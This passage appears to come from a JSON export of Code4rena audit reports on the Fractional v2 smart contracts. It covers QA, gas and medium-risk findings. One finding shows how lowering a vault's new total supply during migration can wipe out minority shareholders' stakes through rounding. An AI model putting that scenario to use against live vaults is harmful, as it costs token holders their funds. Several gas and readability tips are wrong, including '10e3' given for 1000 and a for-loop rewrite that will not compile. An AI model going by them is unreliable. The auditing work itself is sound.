contracts with empty `msg.data` would be locked.    ## SEVERITY  Low    ## PROOF OF CONCEPT  2 instances include:   ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32 ```cpp 32:     receive() external payable {} ```  ### src/modules/Buyout.sol#L53  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53 ```cpp 53:     receive() external payable {} ```   ## TOOLS USED  Manual Analysis    ## MITIGATION  Removes these functions or implement the appropriate logic in these empty blocks  # Non-critical issues  # Constants instead of magic numbers  ## PROBLEM  It is best practice to use constant variables rather than literal values (100, 1000, etc) to make the code easier to understand and maintain.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  7 instances include:  ### src/FERC1155.sol  ```cpp 247:         royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; ```  ### src/modules/Buyout.sol  ```cpp 86:         uint256 buyoutPrice = (msg.value * 100) / 87:             (100 - ((depositAmount * 100) / totalSupply)); ```  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / 210:                 IVaultRegistry(registry).totalSupply(_vault) > 211:             500 212:         ) ```  ### src/modules/Migration.sol  ```cpp 198:         uint256 currentPrice = _calculateTotal( 199:             100, 200:             IVaultRegistry(registry).totalSupply(_vault), 201:             proposal.totalEth, 202:             proposal.totalFractions 203:         ) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Define constant variables for the literal values aforementioned.   # Events indexing  ## PROBLEM  Events should use the maximum amount of indexed fields: up to three parameters. This makes it easier to filter for specific values in front-ends.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:   ### src/interfaces/IBuyout.sol  ```cpp 55: event Start( 56:         address indexed _vault, 57:         address indexed _proposer, 58:         uint256 _startTime, 59:         uint256 _buyoutPrice, 60:         uint256 _fractionPrice 61:     );  65:     event SellFractions(address indexed _seller, uint256 _amount);  69:     event BuyFractions(address indexed _buyer, uint256 _amount);  74:     event End(address _vault, State _state, address indexed _proposer);  79:     event Cash(address _vault, address indexed _casher, uint256 _amount);  83:     event Redeem(address _vault, address indexed _redeemer); ```  ### src/interfaces/IFERC1155.sol  ```cpp 21:     event SetMetadata(address indexed _metadata, uint256 _id); ```  ```cpp 26:     event SetRoyalty( 27:         address indexed _receiver, 28:         uint256 _id, 29:         uint256 _percentage 30:     ); ```  ```cpp 36:     event SingleApproval( 37:         address indexed _owner, 38:         address indexed _operator, 39:         uint256 _id, 40:         bool _approved 41:     ); ```  ```cpp 61:     event FractionsMigrated( 62:         address indexed _oldVault, 63:         address indexed _newVault, 64:         uint256 _proposalId, 65:         uint256 _amount 66:     ); ```  ```cpp 74:     event VaultMigrated( 75:         address indexed _oldVault, 76:         address indexed _newVault, 77:         uint256 _proposalId, 78:         address[] _modules, 79:         address[] _plugins, 80:         bytes4[] _selectors 81:     ); ```  ### src/interfaces/IVault.sol  ```cpp 25:     event Execute(address indexed _target, bytes _data, bytes _response); ```  ```cpp 33:     event TransferOwnership( 34:         address indexed _oldOwner, 35:         address indexed _newOwner 36:     ); ```  ### src/interfaces/IVaultRegistry.sol  ```cpp 33:     event VaultDeployed( 34:         address indexed _vault, 35:         address indexed _token, 36:         uint256 _id 37:     ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add indexed fields to these events so that they have the maximum number of indexed fields possible.   # Event should be emitted in setters  ## PROBLEM  Setters should emit an event so that Dapps can detect important changes to storage   ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/FERC1155.sol  ```cpp 198:     function setContractURI(string calldata _uri) external onlyController ```  ### src/Vault.sol  ```cpp 86: function setMerkleRoot(bytes32 _rootHash) external  ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Emit an event in all setters.   # Public functions can be external  ## PROBLEM  It is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/utils/MerkleBase.sol  ```cpp 43:     function verifyProof( 44:         bytes32 _root, 45:         bytes32[] memory _proof, 46:         bytes32 _valueToProve 47:     ) public pure returns (bool) ``` ```cpp 61:     function getRoot(bytes32[] memory _data) public pure returns (bytes32) ``` ```cpp 73:     function getProof(bytes32[] memory _data, uint256 _node) 74:         public 75:         pure 76:         returns (bytes32[] memory) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Declare these functions as `external` instead of `public`   # Redundant cast  ## PROBLEM  In `Migration.commit()`, `buyout` is cast to type `address`, which is redundant as it is already of type `address`.  ### src/modules/Migration.sol  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true); ```    ## SEVERITY  Non-Critical   ## TOOLS USED  Manual Analysis    ## MITIGATION  ```diff -208:             IFERC1155(token).setApprovalFor(address(buyout), id, true); +208:             IFERC1155(token).setApprovalFor(buyout, id, true); ```   # Scientific notation  ## PROBLEM  For readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Buyout.sol  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `1000` with `10e3`  # Signature malleability  ## PROBLEM  `permit` and `permitAll` in `FERC1155` use Solidity's `ecrecover` to verify signatures. The EVM opcode associated with this function allows for malleable signatures and thus is susceptible to replay attacks. There is no direct threat to the protocol - these functions only approve operators - but it is still a good practice to avoid signature malleability.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/FERC1155.sol  ```cpp 126:             address signer = ecrecover(digest, _v, _r, _s); ```  ```cpp 171:             address signer = ecrecover(digest, _v, _r, _s); ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Use OpenZeppelin's `ECDSA`'s [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)    # TODOS  ## PROBLEM  There is an open TODO in `MerkleBase.sol`. It is merely a gas optimisation issue, but it should still be resolved before contract deployments    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/utils/MerkleBase.sol  ```cpp 24:             // TODO: This can be aesthetically simplified with a switch. Not sure it will 25:             // save much gas but there are other optimizations to be had in here. ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Remove the TODO comment    # Visibility should be explicit  ## PROBLEM  Visibility of variables should be explicitly set.  ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/references/SupplyReference.sol  ```cpp 12:     address immutable registry; ```  ### src/targets/Supply.sol  ```cpp 13:     address immutable registry; ```    ## TOOLS USED  Manual Analysis  "}, {"title": "Migration total supply reduction can be used to remove minority shareholders", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/612", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98   # Vulnerability details  As new total supply can be arbitrary, setting it significantly lower than current (say to 100 when it was 1e9 before) can be used to remove current minority shareholders, whose shares will end up being zero on a precision loss due to low new total supply value. This can go unnoticed as the effect is implementation based.  During Buyout the remaining shareholders are left with ETH funds based valuation and can sell the shares, but the minority shareholders that did contributed to the Migration, that could have other details favourable to them, may not realize that new shares will be calculated with the numerical truncation as a result of the new total supply introduction.  Setting the severity to medium as this is a fund loss impact conditional on a user not understanding the particulars of the implementation.  ## Proof of Concept  Currently migrateFractions() calculates new shares to be transferred for a user as a fraction of her contribution:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472  ```solidity         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth; ```  If Bob the msg.sender is a minority shareholder who contributed to Migration with say some technical enhancements of the Vault, not paying attention to the total supply reduction, his share can be lost on commit():  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L209-L210  ```solidity             // Starts the buyout process             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  As commit() starts the Buyout, Bob will not be able to withdraw as both leave() and withdrawContribution() require INACTIVE state:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L149-L150  ```solidity         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current); ```  If Buyout be successful, Bob's share can be calculated as zero given his small initial share and reduction in the Vault total shares.  For example, if Bob's share together with the ETH funds he provided to Migration were cumulatively less than 1%, and new total supply is 100, he will lose all his contribution on commit() as migrateFractions() will send him nothing.  ## Recommended Mitigation Steps  Consider requiring that the new total supply should be greater than the old one:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98  ```solidity         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply; +       require(proposal.newFractionSupply > proposal.oldFractionSupply, \"\"); // reference version ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/609", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Try `unchecked{++i}` instead of `i++` in loops](G-02)** - **[[G-03] Consider `a = a + b` instead of `a += b`](G-03)** - **[[G-04] Consider marking onlyOwner functions as payable](G-04)** - **[[G-05] Use binary shifting instead of `a / 2^x, x > 0`](G-05)** - **[[G-06] Cache state variables, `MLOAD` << `SLOAD`](G-06)** - **[[G-07] Declare `immutable` instead of state variables](G-07)** - **[[G-08] Define `constants/immutable/state` as `private/internal`](G-08)** - **[[G-09] Check out `calldataloud` vs `mload`](G-09)** - **[[G-10] `Internal` functions can be inlined](G-10)** - **[[G-11] Functions are invoked inside the SC should be marked as internal](G-11)** - **[[G-12] Redundant gas usage](G-12)** - **[[G-13] Remove unnecessary explicit casts](G-13)**    ## Disclaimer<a name=\"0x0\"></a> - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!   ## **[G-01] Try ++i instead of i++**<a name=\"G-01\"></a>  ### ***Description:***   - In case of i++, the compiler needs to create a temp variable to return and then it gets incremented.     - In case of ++i, the compiler just simply returns already incremented value.  ### ***Recommendations:***   - Use prefix increment instead of postfix.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]         for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]         for (uint256 i = 0; i < length; i++) {}      ```  ## **[G-02] Try `unchecked{++i};` instead of `i++;` in loops**<a name=\"G-02\"></a>  ### ***Description:***   - If the for loop runs 100 times, it's about 10k units of gas which can be saved in comparison. Don't worry about overflow, when the number is just simply getting incremented by 1. There are ~1e80 atoms in the universe, so 2^256 is closed to that number, therefore it's no a way to be overflowed, because of the gas limit as well.     ### ***Recommendations:***   - Try to use unchecked{} box where it's no a way to get a overflow/underflow. Significant gas usage optimization.  ### ***All occurances:***    - Contracts:      ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]           for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]           for (uint256 i = 0; i < length; i++) {}      ``` ## **[G-03] Consider `a = a + b` instead of `a += b`**<a name=\"G-03\"></a>  ### ***Description:***   - It has an impact on the deployment cost and the cost for distinct transaction.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [86-86]           totalSupply[_id] += _amount;          // Lines: [270-271]           balanceOf[_from][_id] -= _amount;           balanceOf[_to][_id] += _amount;        file: src/Buyout.sol       ...............................          // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;          // Lines: [139-139]           buyoutInfo[_vault].ethBalance -= ethAmount;        file: src/Migration.sol       ...............................          // Lines: [123-124]           proposal.totalEth += msg.value;           userProposalEth[_proposalId][msg.sender] += msg.value;          // Lines: [134-135]           proposal.totalFractions += _amount;           userProposalFractions[_proposalId][msg.sender] += _amount;                    // Lines: [156-156]           proposal.totalFractions -= amount;          // Lines: [160-160]           proposal.totalEth -= ethAmount;          // Lines: [497-497]           treeLength += IModule(_modules[i]).getLeafNodes().length;        file: src/MerkleBase.sol       ...............................          // Lines: [147-147]           for (uint256 i; i < length - 1; i += 2) {}          // Lines: [190-190]           ceil -= pOf2; // see above   ## **[G-04] Consider marking onlyOwner functions as payable**<a name=\"G-04\"></a>  ### ***Description:***   - A little optmization in comparison between payable and non-payable functions. Also, there is a little tradeoff here between readability and optimization.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [56-63]           function burn(               address _from,               uint256 _id,               uint256 _amount           ) external onlyRegistry {}          // Lines: [79-87]           function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [198-200]           function setContractURI(string calldata _uri) external onlyController {}          // Lines: [205-211]           function setMetadata(address _metadata, uint256 _id)               external               onlyController           {}          // Lines: [217-225]           function setRoyalties(               uint256 _id,               address _receiver,               uint256 _percentage           ) external onlyController {}          // Lines: [229-232]           function transferController(address _newController)               external               onlyController           {}         ``` ## **[G-05] Use binary shifting instead of `a / 2^x, x > 0`**<a name=\"G-05\"></a>  ### ***Description:***   - It's also pretty impactful approach especially in loops.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/MerkleBase.sol       ...............................                // Lines: [100-100]           _node = _node / 2;          // Lines: [136-136]           result = new bytes32[](length / 2 + 1);          // Lines: [142-142]           result = new bytes32[](length / 2);       ``` ## **[G-06] Cache state variables, `MLOAD` << `SLOAD`**<a name=\"G-06\"></a>  ### ***Description:***   - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................          // Lines: [91-91]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);           // Lines: [297-298]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);          // Lines: [303-305]           _controller == address(0)               ? controllerAddress = INITIAL_CONTROLLER()               : controllerAddress = _controller;        file: src/Bayout.sol       ...............................         // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;         file: src/Vault.sol       ...............................          // Lines: [25-25]           if (nonce != 0) revert Initialized(owner, msg.sender, nonce);          // Lines: [76, 87, 94, 102]           if (owner != msg.sender) revert NotOwner(owner, msg.sender);          // Lines: [132-132]           if (owner_ != owner) revert OwnerChanged(owner_, owner);        file: src/Migration.sol       ...............................          // Lines: [126-127; 137-138]           // Comment:             - proposal.totalEth += msg.value => proposal.totalEth = proposal.totalEth(SLOAD) + msg.value;                  - proposal.totalEth = proposal.totalEth(which you can store in memory to avoid SLOAD) + msg.value.               proposal.totalEth += msg.value;             userProposalEth[_proposalId][msg.sender] += msg.value;                proposal.totalFractions += _amount;             userProposalFractions[_proposalId][msg.sender] += _amount;          file: src/Buyout.sol         ...............................           // Lines: [474-502]               permissions[0] = Permission(               address(this),               supply,               ISupply(supply).burn.selector             );             permissions[1] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC20Transfer.selector             );             permissions[2] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC721TransferFrom.selector             );             permissions[3] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155TransferFrom.selector             );             permissions[4] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155BatchTransferFrom.selector             );          ```  ## **[G-07] Declare `immutable` instead of state variables**<a name=\"G-07\"></a>  ### ***Description:***   - Since it's initialized once, there is no reason for state variable allocation.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [19-19]           address internal _controller;          // Lines: [21-21]           string public contractURI;          // Lines: [142-142]           result = new bytes32[](length / 2);        file: src/Vault.sol       ...............................         // Lines: [15-15]           bytes32 public merkleRoot;          // Lines: [17-17]           uint256 public nonce;        file: src/VaultFactory.sol       ...............................         // Lines: [15-15]           address public implementation;        file: src/Buyout.sol       ...............................         // Lines: [29-33]           address public registry;           address public supply;           address public transfer;        ``` ## **[G-08] Define public `constants/immutable/state` as `private/internal`**<a name=\"G-08\"></a>  ### ***Description:***   - Declaring state variables as private/internal doesn't generate getter functions.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [15-17]           string public constant NAME = \"FERC1155\";           string public constant VERSION = \"1\";          // Lines: [21-21]           string public contractURI;          // Lines: [23-30]           mapping(address => mapping(address => mapping(uint256 => bool)))         public isApproved;           /// @notice Mapping of metadata contracts for token ID types => metadata address           mapping(uint256 => address) public metadata;           /// @notice Mapping to track account nonces for metadata txs owner => nonces           mapping(address => uint256) public nonces;           /// @notice Mapping to track total supply for token ID types => totalSupply           mapping(uint256 => uint256) public totalSupply;        file: src/Vault.sol       ...............................         // Lines: [21-21]           mapping(bytes4 => address) public methods;        file: src/VaultRegistry.sol       ...............................         // Lines: [17-21]           address public immutable factory;           address public immutable fNFT;           address public immutable fNFTImplementation;          // Lines: [23-25]           mapping(address => uint256) public nextId;           mapping(address => VaultInfo) public vaultToToken;        file: src/Buyout.sol       ...............................         // Lines: [35-38]           uint256 public constant PROPOSAL_PERIOD = 2 days;           uint256 public constant REJECTION_PERIOD = 4 days;           mapping(address => Auction) public buyoutInfo;     ``` ## **[G-09] Check out `calldataloud` vs `mload`**<a name=\"G-09\"></a>  ### ***Description:***   - Consider reading args directly from calldata instead of memory, if args doesn't require any changes.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}          // Lines: [79-79]         // Comments: OZ marked `bytes memory _data`, it is because those functions are virtual, hence could be overrided. Therefore, allowing modifying args for those overrided versions. Here, we just have an external function, therefore it's better to read bytes directly from calldata, especially, if the `_data` is a massive flow.             function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}        file: src/Vault.sol       ...............................                // Lines: [73-75]           function install(bytes4[] memory _selectors, address[] memory _plugins)               external           {}         // Lines: [101-101]           function uninstall(bytes4[] memory _selectors) external {}        file: src/VaultRegistry.sol       ...............................                // Lines: [51-54]           function create(               bytes32 _merkleRoot,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createFor(               bytes32 _merkleRoot,               address _owner,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createCollection(             bytes32 _merkleRoot,             address[] memory _plugins,             bytes4[] memory _selectors         ) external returns (address vault, address token) {}          // Lines: [102-107]           function createInCollection(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [147-152]           function createCollectionFor(               bytes32 _merkleRoot,               address _controller,               address[] memory _plugins,               bytes4[] memory _selectors           ) public returns (address vault, address token) {}          // Lines: [165-170]           function _deployVault(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) private returns (address vault) {}        file: src/Buyout.sol       ...............................           function batchWithdrawERC1155(               address _vault,               address _token,               address _to,               uint256[] calldata _ids,               uint256[] calldata _values,               bytes32[] calldata _erc1155BatchTransferProof           ) external {}            // Look, how beatufil it looks like with calldata. Thank you for that!!!!!!!      ``` ## **[G-10] `Internal` functions can be inlined**<a name=\"G-10\"></a>  ### ***Description:***   - It takes some extra `JUMP`s which costs around 12 gas uints for each `JUMP`.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [324-330]           function _computePermitStructHash(               address _owner,               address _operator,               uint256 _id,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [350-355]           function _computePermitAllStructHash(               address _owner,               address _operator,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [371-371]           function _computeDomainSeparator() internal view returns (bytes32) {}          // Lines: [388-392]           function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)               internal               pure               returns (bytes32)           {}      ``` ## **[G-11] Functions which are invoked inside the SC should be marked as internal**<a name=\"G-11\"></a>  ### ***Description:***   - If i'm not mistaken, these getter functions should be defined as internal.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [309-316]             function INITIAL_CONTROLLER() public pure returns (address) {               return _getArgAddress(0);             }              function VAULT_REGISTRY() public pure returns (address) {                 return _getArgAddress(20);             }       ``` ## **[G-12] Redundant gas usage**<a name=\"G-12\"></a>  ### ***Description:***   - Extra gas usage without the reason, use _selectors.length in loops.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [77-77]           uint256 length = _selectors.length;          // Lines: [103-103]           uint256 length = _selectors.length;        ``` ## **[G-13] Remove unnecessary explicit casts**<a name=\"G-13\"></a>  ### ***Description:***   - There is no reason to explicitly cast `address` to `address`, etc...     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/VaultRegistry.sol       ...............................                // Lines: [73-73]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [56-56]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [154-154]           abi.encodePacked(_controller, address(this))       ```  ## Kudos for the quality of the code! It's pretty easy to explore! "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/578", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "## FINDINGS ### Using immutable on variables that are only set in the constructor and never after   File: Migration.sol  [line 39](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)  ```     address public registry; ```  The above is only set in the constructor and never set again  File: Migration.sol [line 37](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)  ```     address payable public buyout; ``` File: Buyout.sol [line 29](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)  ```     address public registry; ```  File: Buyout.sol [line 31](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)  ```     address public supply; ```  File: Buyout.sol [line 33](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)  ```     address public transfer; ```  File: BaseVault.sol [line 19](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)  ```     address public registry; ``` ### Using unchecked blocks to save gas - Increments in for loop can be unchecked  ( save 30-40 gas per loop iteration) The majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop . eg.  e.g Let's work with a sample loop below.  ``` for(uint256 i; i < 10; i++){ //doSomething }  ``` can be written as shown below. ``` for(uint256 i; i < 10;) {   // loop logic   unchecked { i++; } } ```  We can also write  it as an inlined function like below.  ``` function inc(i) internal pure returns (uint256) {   unchecked { return i + 1; } } for(uint256 i; i < 10; i = inc(i)) {   // doSomething } ```  **Affected code** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{     ++i;   }         } ``` **Other Instances to modify** File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ``` [see resource](https://github.com/ethereum/solidity/issues/10695)  ### Cache storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs. SLOADs are expensive 100 gas compared to MLOADs/MSTOREs(3gas) Storage value should get cached in memory   NB: *Some functions have been truncated where necessary to just show affected parts of the code*  #### Migration.sol.propose() : registry should be cached (saves ~ 92 gas) File: Migration.sol [line 81-95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72-L99)  ```     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Initializes migration proposal info            proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 81](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L81) SLOAD 2: [line 95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L95)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 372 gas) File: Migration.sol [line 435,467,470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L482)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         (address token, uint256 newFractionId) = IVaultRegistry(registry)             .vaultToToken(newVault);         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth;          );     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 435](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L435) SLOAD 2: [line 467](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L467) SLOAD 3: [line 470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L470)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 101 gas) File:Migration.sol [line 184,200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L179-L214)  ```     function commit(address _vault, uint256 _proposalId)         external         returns (bool started)     {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         // Calculates current price of the proposal based on total supply         uint256 currentPrice = _calculateTotal(             100,             IVaultRegistry(registry).totalSupply(_vault),             proposal.totalEth,             proposal.totalFractions         );      } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L184) SLOAD 2: [line 200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L200)   #### Buyout.sol.start() : registry should be cached (saves ~ 83 gas) File:Buyout.sol [line 61-71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L57-L73)  ```     function start(address _vault) external payable {                 // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );        ...         // Gets total supply of fractional tokens for the vault         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         // Gets total balance of fractional tokens owned by caller         uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id); ```  In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 61](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L61) and the SLOAD 2:  [line 71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L71)  #### Buyout.sol.cash() : registry should be cached (saves ~ 84 gas) File: Buyout.sol [line 246-267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244-L273)  ```     function cash(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address 